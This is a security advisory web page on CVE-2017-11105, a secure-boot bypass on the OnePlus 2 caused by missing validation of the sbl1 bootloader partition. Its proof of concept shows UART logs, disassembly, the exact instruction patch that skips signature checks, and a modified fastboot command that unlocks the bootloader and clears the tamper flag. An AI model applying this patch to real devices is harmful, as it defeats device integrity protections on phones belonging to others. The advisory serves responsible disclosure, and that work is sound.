<!DOCTYPE html>
<html lang="en">
<head>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
<script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>[CVE-2017-11105] OnePlus 2 Lack of SBL1 Validation Broken Secure Boot</title>
<meta name="name" content="CVE-2017-11105">
<meta name="description" content="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot">
<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@alephsecurity">
<meta name="twitter:creator" content="@alephsecurity">
<meta name="twitter:title" content="CVE-2017-11105">
<meta name="twitter:url" content="https://alephsecurity.com/vulns/aleph-2017026">
<meta name="twitter:description" content="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot">
<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="og:site_name" content="">
<meta property="og:title" content="CVE-2017-11105">
<meta property="og:type" content="article">
<meta property="og:description" content="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot">
<meta property="og:url" content="https://alephsecurity.com/vulns/aleph-2017026">
<meta property="article:published_time" content="2017-08-01T00:00:00+00:00">
<meta property="article:author" content="https://alephsecurity.com">
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
<link rel="icon" href="/favicon.png">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
<link rel="stylesheet" type="text/css" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>
</head>
<body>
<div class="wrapper">
<div class="page__back">
<a href="/">&lt;-- <span class="smallogo">◊ê</span></a>
</div>
<div class="page">
<div class="advisory">
<div class="advisory__title">
<h1>OnePlus 2 Lack of SBL1 Validation Broken Secure Boot</h1>
</div>
<div class="advisory__subtitle">
Aleph Research Advisory
</div>
<div class="advisory__meta">
<p></p>
</div>
<h2>Identifier</h2>
<div class="cve-critical"><span class="" title="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot"><a href="/vulns/aleph-2017026">CVE-2017-11105</a></span></div>
<h2>Severity</h2>
Critical
<h2>Product</h2>
<p>OnePlus 2</p>
<h2>Technical Details</h2>
<div class="advisory__content" ?>
<p>OnePlus 2 (a 2015 Qualcomm Snapdragon 810 device) successfully boots with a tampered Secondary Bootloader (<code class="language-plaintext highlighter-rouge">sbl1</code>) partition although it is digitally-signed, hence it is not validated by its Primary Bootloader (PBL), maybe due to lenient hardware configuration.</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="nc"> [pbl]</span>
  `-.<span class="rd">
    [sbl1]</span>
     `-.<span class="nc">
       [aboot]</span>
       |`-.
       |  <span class="nc">[...]</span>
       |-<span class="nc">[tz]</span>
       |-<span class="nc">[rpm]</span>
       |-<span class="nc">[pmic]</span>
       .
       .
</code></pre>
</div>
<p>Attackers capable of tampering with the <code class="language-plaintext highlighter-rouge">sbl1</code> partition can then disable the signature validation of the rest of the bootloader chain and other SBL-validated partitions such as TrustZone and ABOOT.</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="nc"> [pbl]</span>
  `-.<span class="rd">
    [sbl1</span>*<span class="rd">]</span>
     `-.<span class="rd">
       [aboot]</span>
       |`-.
       |  <span class="rd">[...]</span>
       |-<span class="rd">[tz]</span>
       |-<span class="rd">[rpm]</span>
       |-<span class="rd">[pmic]</span>
       .
       .

* - Modified as per our PoC
</code></pre>
</div>
<p>Equivalent partitions of older OnePlus devices (<a href="https://forums.coronalabs.com/topic/60894-phones-that-have-no-secure-boot-not-locked-bootloader/">One</a>/X) seem to have no digital signatures at all, and therefore are vulnerable as well.</p>
<h2 id="proof-of-concept">Proof-of-Concept</h2>
<p>The goal of our PoC, whose results are available in our <a href="https://github.com/alephsecurity/research/tree/master/CVE-2017-11105">repo</a>, is to disable the signature validation (implemented by SBL) of the rest of the partitions such as TrustZone and ABOOT.</p>
<p>In order to find the exact routine within the <code class="language-plaintext highlighter-rouge">sbl1</code> image that does that, we first discovered the UART ports exposed on the OnePlus 2 board, by simply probing the available ones using our beloved <a href="https://www.saleae.com/">Logic Analyzer</a>:</p>
<p><img src="/assets/img/opo2uart.png" alt="&quot;OnePlus 2 UART ports&quot;" /></p>
<p>Booting with authentic partitions results in the following debug messages through UART:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> B -    274561 - SBL1, Start
 B -    281728 - scatterload_region &amp;&amp; ram_init, Start
 B -    296490 - boot_flash_init, Start
 D -        30 - boot_flash_init, Delta
 B -    297039 - boot_config_data_table_init, Start
 D -      3629 - boot_config_data_table_init, Delta
 B -    306067 - Image Load, Start
 D -     14060 - PMIC Image Loaded, Delta
 B -    320097 - sbl1_ddr_set_params, Start
 D -       579 - sbl1_ddr_set_params, Delta
 B -    326136 - pm_device_init, Start
 B -    328607 - PON REASON:PM0:0x2000000a0 PM1:0x2000000a0
 D -     37332 - pm_device_init, Delta
 [...]
 B -    763720 - Image Load, Start
 D -     36020 - APPSBL Image Loaded, Delta
 B -    799740 - sbl1_efs_handle_cookies, Start
 D -       457 - sbl1_efs_handle_cookies, End 
 B -    805383 - RPM sync cookie updated
 B -    808921 - SBL1, End 
 D -    536708 - SBL1, Delta
 Android Bootloader - UART_DM Initialized!!!
</code></pre></div></div>
<p>Booting with tampered SBL-validated partitions (e.g. <code class="language-plaintext highlighter-rouge">aboot</code>, <code class="language-plaintext highlighter-rouge">tz</code>), however, results in the following error (or similar):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>B -    205997 - SBL1, Start
B -    213317 - scatterload_region &amp;&amp; ram_init, Start
B -    227896 - boot_flash_init, Start
D -        30 - boot_flash_init, Delta
B -    228475 - boot_config_data_table_init, Start
D -      3599 - boot_config_data_table_init, Delta
[...]
B -   1184406 - Qsee Execution, Start
D -     80184 - Qsee Execution, Delta
B -   1436458 - Image Load, Start
D -     73871 - RPM Image Loaded, Delta
B -   1510573 - Signal PBL to Jump to RPM FW
B -   1512037 - Image Load, Start
D -      2562 - WDT Image Loaded, Delta
B -   1518107 - Image Load, Start
B -   1683996 - Error code 302e at /work/home/jenkins/14049_user_MP_HYDROGEN/MODEM/MSM8994/msm8994/boot_images/core/boot/secboot3/src/boot_elf_loader.c Line 829
</code></pre></div></div>
<p>By back-referencing the error string with IDA we can easily pinpoint the SBL function which validates the rest of the chain:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROM:00000000FEC0E908 loc_FEC0E908                            ; CODE XREF: sub_FEC0E89C+1Cj
ROM:00000000FEC0E908        MOV             X0, X19
ROM:00000000FEC0E90C        BL              sub_FEC0F9A0
ROM:00000000FEC0E910        CBZ             W0, loc_FEC0E934
ROM:00000000FEC0E914        ADRP            X0, #<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4dbd2d2ebf2f1f783f2f1868cf4e4f5f3f1">[email&#160;protected]</a>
ROM:00000000FEC0E918        LDR             X3, [X0,#<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="016e67675e474442364744333941514046444e4747">[email&#160;protected]</a>]
ROM:00000000FEC0E91C        ADRP            X0, #(aSignalPblToJum+0x16) ; -
ROM:00000000FEC0E920        ADD             X0, X0, #<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2c4d7b435e4764434149664942731d156c7c6d6b69636a6a">[email&#160;protected]</a> ; "/work/home/jenkins/14049_M_OOS_user_MP2"...
ROM:00000000FEC0E924        MOV             W1, #0x33D
ROM:00000000FEC0E928        MOV             W2, #0x302E
ROM:00000000FEC0E92C        BLR             X3
ROM:00000000FEC0E930
ROM:00000000FEC0E930 loc_FEC0E930
ROM:00000000FEC0E930        B               loc_FEC0E930
ROM:00000000FEC0E934
ROM:00000000FEC0E934 loc_FEC0E934                            ; CODE XREF: sub_FEC0E89C+74j
ROM:00000000FEC0E934        LDR             X19, [SP,#0x30+var_28]
ROM:00000000FEC0E938        LDP             X20, X21, [SP,#0x30+var_20]
ROM:00000000FEC0E93C        LDP             X22, X30, [SP,#0x30+var_10]
ROM:00000000FEC0E940        ADD             SP, SP, #0x30
ROM:00000000FEC0E944        RET
ROM:00000000FEC0E944 ; End of function sub_FEC0E89C
</code></pre></div></div>
<p>Notice the spinlock @ <code class="language-plaintext highlighter-rouge">0xFEC0E930</code>. Quick patching of the call @ <code class="language-plaintext highlighter-rouge">0xFEC0E90C</code> with <code class="language-plaintext highlighter-rouge">MOVZ W0, #0</code> will avoid the failing path.
And indeed, booting with tampered <code class="language-plaintext highlighter-rouge">aboot</code> and <code class="language-plaintext highlighter-rouge">tz</code> now succeeds:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>B -    276757 - SBL1, Start
[...]
D -      7564 - QHEE Image Loaded, Delta
B -    760548 - Image Load, Start
D -     31690 - QSEE Image Loaded, Delta
[...]
D -     36021 - APPSBL Image Loaded, Delta
B -   1102178 - sbl1_efs_handle_cookies, Start
D -       457 - sbl1_efs_handle_cookies, End
B -   1107790 - RPM sync cookie updated
B -   1111420 - SBL1, End
D -    836920 - SBL1, Delta
Android Bootloader - UART_DM Initialized!!!
[50] project name got 14049
[...]
[1130] lk fg_volt = 4038
[1130] Backlight 1
[1670] WARM: power_on_reason  is HARD_RESET [0x21]
[1680] WARM: power_on_reason  is PON1 [0x21]
[1680] WARM: power_off_reason  is KPDPWR_N [0x80]
[1850] Channel alloc freed
[1870] Jumping to kernel via monitor
</code></pre></div></div>
<p>To prove we can execute code within <code class="language-plaintext highlighter-rouge">aboot</code>, we have also modified one of the fastboot oem commands, made it temporarily unlock the bootloader, and turn off the device tampering flag:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">cowabunga_F92C60C</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[...]</span>
  <span class="n">dword_F978FA4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>    <span class="c1">// unlocked</span>
  <span class="n">dword_F978FA8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    <span class="c1">// tampered</span>
  <span class="n">FAIL</span><span class="p">(</span><span class="s">"pizza"</span><span class="p">,);</span>
<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The result is as follows:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>fastboot oem device-info 2&gt;&amp;1 | <span class="nb">grep </span>Device
<span class="go">(bootloader)    Device tampered: true
(bootloader)    Device unlocked: false
(bootloader)    Device is_verified: false

</span><span class="gp">$</span><span class="w"> </span>fastboot oem cowabunga
<span class="c">...
</span><span class="go">FAILED (remote: pizza)
finished. total time: 0.020s

</span><span class="gp">$</span><span class="w"> </span>fastboot oem device-info 2&gt;&amp;1 | <span class="nb">grep </span>Device
<span class="go">(bootloader)    Device tampered: false
(bootloader)    Device unlocked: true
(bootloader)    Device is_verified: false
</span></code></pre></div></div>
</div>
<h2>Timeline</h2>
<div class="list"><ul><li><div class="list__date"><span>24-Sep-17<span></div>: Deadline Extension.</li><li><div class="list__date"><span>01-Aug-17<span></div>: Public disclosure.</li><li><div class="list__date"><span>08-Jul-17<span></div>: <span class="cve-critical" title="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot"><a href="/vulns/aleph-2017026">CVE-2017-11105</a></span> assigned.</li><li><div class="list__date"><span>07-Jul-17<span></div>: CVE ID requested.</li><li><div class="list__date"><span>06-Jul-17<span></div>: Deadline.</li><li><div class="list__date"><span>05-Jul-17<span></div>: Vendor reply: "Won't fix" ("About to reach the product's lifecycle").</li><li><div class="list__date"><span>30-Jun-17<span></div>: Vendor acknowledged report (deadline extended).</li><li><div class="list__date"><span>26-Jun-17<span></div>: Reported.</li><li><div class="list__date"><span>22-Jun-17<span></div>: Added as <span class="cve-critical" title="OnePlus 2 Lack of SBL1 Validation Broken Secure Boot"><a href="/vulns/aleph-2017026">ALEPH-2017026</a></span>.</li></ul></div>
<h2>Credit</h2>
<div class="list">
<ul>
<li>
<a href="/authors/roeeh">Roee Hay</a> (<a href="https://twitter.com/roeehay">@roeehay</a>) of Aleph Research, HCL Technologies
</li>
</ul>
</div>
</div>
</div>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>
